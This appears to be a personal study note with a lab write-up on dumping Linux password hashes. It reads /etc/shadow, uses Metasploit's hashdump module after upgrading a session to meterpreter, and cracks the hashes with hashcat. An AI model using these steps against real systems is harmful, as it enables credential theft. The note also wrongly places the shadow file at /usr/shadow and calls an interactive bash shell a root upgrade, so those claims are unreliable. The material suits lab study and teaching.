Related to [[Linux Exploitation]], [[Privilege Escalation]], [[Post Exploitation]]

The shadow file stores passwords related to users, its at /usr/shadow and can only be accessed by the root user.

The passwords will be hashes, we can see with which algorithm using this chart:

![[linux_hash_chart.png]]

---

## Lab Writeup

The exploiting of the lab is trivial searchsploit-metasploit workflow.

We start with a shell session which we can upgrade to root via:

``` bash
/bin/bash -i
```

We can background the session and then upgrade it to meterpreter through:

``` bash
sessions -u 1
```

We then enter the meterpreter session.

We can use:

``` bash
cat /etc/shadow
```

Or we can use hashdump

``` bash
use post/linux/gather/hashdump
set SESSION [sessionnum]
run
```

The perk here is hashdump also unshadows the retrieved hashes.

We can crack the password using auxiliary/analyze/crack_linux or hashcat


